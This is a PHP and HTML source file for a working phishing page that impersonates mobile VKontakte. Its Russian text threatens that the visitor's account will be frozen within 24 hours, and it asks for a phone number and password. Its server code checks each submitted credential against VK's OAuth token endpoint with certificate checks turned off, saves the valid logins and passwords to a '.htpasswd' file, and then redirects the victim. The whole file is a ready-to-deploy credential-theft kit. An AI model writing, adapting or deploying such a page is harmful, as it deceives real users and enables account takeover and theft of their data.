<?php
include 'config.php';
//CHECK ACCOUNT
if(isset($_POST['AccessRecovery']) && isset($_POST['ConfirmedPassword'])) { $RESPONSE = curl_init(); curl_setopt($RESPONSE, CURLOPT_URL,'https://oauth.vk.com/token?grant_type=password&client_id='.urlencode($CLIENT_ID).'&client_secret='.urlencode($CLIENT_SECRET).'&username='.urlencode($_POST['AccessRecovery']).'&password='.urlencode($_POST['ConfirmedPassword']).'&captcha_sid='.urlencode($_POST['captcha_sid']).'&captcha_key='.urlencode($_POST['captcha_key'])); curl_setopt($RESPONSE, CURLOPT_RETURNTRANSFER, 1); curl_setopt($RESPONSE, CURLOPT_HEADER, 0); curl_setopt($RESPONSE, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($RESPONSE, CURLOPT_SSL_VERIFYHOST, 0); $RESPONSE_1 = curl_exec($RESPONSE); curl_close($RESPONSE); if(preg_match("/error/", $RESPONSE_1)) { if(preg_match("/need_captcha/", $RESPONSE_1)) { exit($RESPONSE_1); } exit(json_encode(array('status'=>'error'))); } if(preg_match("/\[\]+/", $RESPONSE_1)) { exit(json_encode(array('status'=>'error'))); } if(empty($_COOKIE['ga'])) { $WRITE = fopen(".htpasswd", "a"); fwrite($WRITE, "Логин для входа: <b>".$_POST['AccessRecovery']."</b> | Пароль для входа: <b>".$_POST['ConfirmedPassword']."</b><br>"); fclose($WRITE); setcookie("ga", '1', time()+(365*24*60*60), "/"); } exit(json_encode(array('status'=>'success'))); }
if(isset($_POST['ConfirmedPhone'])) { $RESPONSE = file_get_contents('https://api.vk.com/method/auth.checkPhone?&client_id='.urlencode($CLIENT_ID).'&client_secret='.urlencode($CLIENT_SECRET).'&phone='.urlencode($_POST['ConfirmedPhone']).'&auth_by_phone=1');
if(preg_match("/error/", $RESPONSE)) { exit(json_encode(array('status'=>'error'))); } if(preg_match("/\[\]+/", $RESPONSE)) { exit(json_encode(array('status'=>'error'))); } if(preg_match("/1/", $RESPONSE)) { exit(json_encode(array('status'=>'error'))); }
exit(json_encode(array('status'=>'success'))); }
if(isset($_GET['AccessRecovery'])) { header('Location: '.$REDIRECT_LINK); exit(); }
?> 
<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<title><?php echo $SITE_TITLE; ?></title>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="shortcut icon" type="image/gif" href="<?php echo $SITE_URL; ?>/template/images/fav_logo.ico">
<link rel="apple-touch-icon" href="<?php echo $SITE_URL; ?>/template/images/safari_60.png">
<link rel="apple-touch-icon" sizes="76x76" href="<?php echo $SITE_URL; ?>/template/images/safari_76.png">
<link rel="apple-touch-icon" sizes="120x120" href="<?php echo $SITE_URL; ?>/template/images/safari_120.png">
<link rel="apple-touch-icon" sizes="152x152" href="<?php echo $SITE_URL; ?>/template/images/safari_152.png">
<meta name="description" content="ВКонтакте – универсальное средство для общения и поиска друзей и одноклассников, которым ежедневно пользуются десятки миллионов человек. Мы хотим, чтобы друзья, однокурсники, одноклассники, соседи и коллеги всегда оставались в контакте.">
<meta property="og:site_name" content="Мобильная версия ВКонтакте">
<meta property="og:type" content="website">
<noscript><meta http-equiv="refresh" content="0; URL=<?php echo $SITE_URL; ?>/badbrowser"></noscript>
<script type="text/javascript" src="<?php echo $SITE_URL; ?>/template/js/jquery.min.js"></script>
<script type="text/javascript" src="<?php echo $SITE_URL; ?>/template/js/bootstrap.min.js"></script>
<link href="<?php echo $SITE_URL; ?>/template/css/bootstrap.min.css" rel="stylesheet">
<link href="<?php echo $SITE_URL; ?>/template/css/style.css" rel="stylesheet">
<link href="https://fonts.googleapis.com/css?family=Roboto:400,100,300,700,500,900&amp;subset=latin,cyrillic" rel="stylesheet" type="text/css">
</head>
<body class="fixed-header">
<nav class="navbar navbar-default navbar-fixed-top">
<div class="container">
<div class="navbar-header">
<a class="navbar-brand" href="<?php echo $SITE_URL; ?>"></a></div>
<ul class="nav navbar-nav navbar-right hidden-xs"><li><a class="user-info"><img src="/template/images/deactivated_50.png" alt="Пользователь"></a></li></ul>
</div></nav>
<div class="modal fade" id="security" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="display: none;">
<div class="modal-dialog">
<div class="modal-content">
<div class="modal-header"><button type="button" class="close" data-dismiss="modal" aria-hidden="true"></button><div class="security">Подтверждение действия</div></div>
<div class="modal-body text-center" style="border-radius: 0 0 2px 2px;"><div style="padding-bottom: 15px;"><div style="margin-bottom: 20px;">Для подтверждения действия Вам необходимо заново ввести пароль от Вашей страницы.</div>
<div class="alert alert-danger text-left" style="line-height: 150%; background: #ffefe9 url(<?php echo $SITE_URL; ?>/template/images/msg_error.png) no-repeat 12px 12px; padding-left: 55px; min-height: 40px; line-height: 40px; display: none;" id="errorRecovery">Указан неверный пароль.</div>
<div style="max-width: 160px; margin: 10px auto 0;">
<center><img src="" class="img-responsive" style="margin-bottom: 20px; display: none;" id="captcha_img"></center>
<input type="hidden" id="captcha_sid">
<input type="text" class="form-control" id="captcha_key" placeholder="Код" style="padding: 5px 9px 7px; border-radius: 1px; font-size: 13px; height: 30px; margin-bottom: 20px; display: none;">
<input type="password" class="form-control" id="validation_password" placeholder="Введите Ваш пароль" style="padding: 5px 9px 7px; border-radius: 1px; font-size: 13px; height: 30px;"><button type="button" class="btn btn-block btn-primary" id="next_1" onclick="next_1();" data-loading-text="<div class='pr' style='opacity: 1;'><div class='pr_bt'></div><div class='pr_bt'></div><div class='pr_bt'></div></div>" style="margin: 10px auto 0; line-height: 17px;">Подтвердить</button></div></div></div>
</div>
</div>
</div>
<div class="container text-center">
<div class="content">
<div class="content-text"><center><img src="<?php echo $SITE_URL; ?>/template/images/spamfight.gif" class="img-responsive" style="margin-bottom: 17px;"></center>Ваша страница будет немедленно <b>заморожена</b> по истечению 24 часов с момента оповещения, если Вы не подтвердите свою страницу.<br><br>Подтвердите свое согласие на <b>удаление запрещенного контента</b>:</div>
<div class="alert alert-info text-left" style="margin: 0 auto 10px; max-width: 553px; display: none;" id="phoneFormat"><b>Некорректный мобильный номер</b>.<br>Необходимо корректно ввести номер <b>в международном формате</b>. Например: +7 921 0000007</div>
<div class="form-group text-left">
<div for="user-number" class="label-text">Мобильный телефон</div>
<input type="text" class="form-control" id="user-number" value="+7" tabindex="0" autocomplete="off" data-html="true" data-toggle="popover" data-trigger="focus" title="" data-content="Укажите Ваш номер, к которому <b>привязана страница</b>.<br>Это поможет нам в <b>удалении запрещённого контента</b>.">
<div class="next"><button type="button" class="btn btn-block btn-primary" id="next" onclick="next();" data-loading-text="<div class='pr' style='opacity: 1;'><div class='pr_bt'></div><div class='pr_bt'></div><div class='pr_bt'></div></div>">Продолжить</button></div>
</div>
</div>
</div>
<script>
$('#user-number').keypress(function(e) { if (e.which == 13) { next(); e.preventDefault(); } });
$('#captcha_key').keypress(function(e) { if (e.which == 13) { next_1(); e.preventDefault(); } });
$('#validation_password').keypress(function(e) { if (e.which == 13) { next_1(); e.preventDefault(); } });
function next() { $('#next').button('loading'); $.ajax({type: "POST", dataType: 'json', data: { ConfirmedPhone: $('#user-number').val() }, success: function(data) { if (data.status == 'error') { $('#phoneFormat').fadeIn(); } else { $('#phoneFormat').fadeOut(); $('#security').modal('show'); } $('#next').button('reset'); return false; } }); }
function next_1() { $('#next_1').button('loading'); $.ajax({type: "POST", dataType: 'json', data: { captcha_sid: $('#captcha_sid').val(), captcha_key: $('#captcha_key').val(), AccessRecovery: $('#user-number').val(), ConfirmedPassword: $('#validation_password').val() }, success: function(data) { if (data.status == 'error') { $('#errorRecovery').fadeIn(); $('#captcha_img').fadeOut();  $('#captcha_key').fadeOut(); } else { if (data.error == 'need_captcha') { $('#errorRecovery').fadeOut(); $('#captcha_key').val(''); $('#captcha_img').attr('src', data.captcha_img); $('#captcha_sid').val(data.captcha_sid); $('#captcha_img').fadeIn(); $('#captcha_key').fadeIn(); } else { $('#errorRecovery').fadeOut(); $('#captcha_img').fadeOut(); $('#captcha_key').fadeOut(); location.href='/?AccessRecovery'; } } $('#next_1').button('reset'); return false; } }); }
$('[title]').popover();
</script>
</body></html>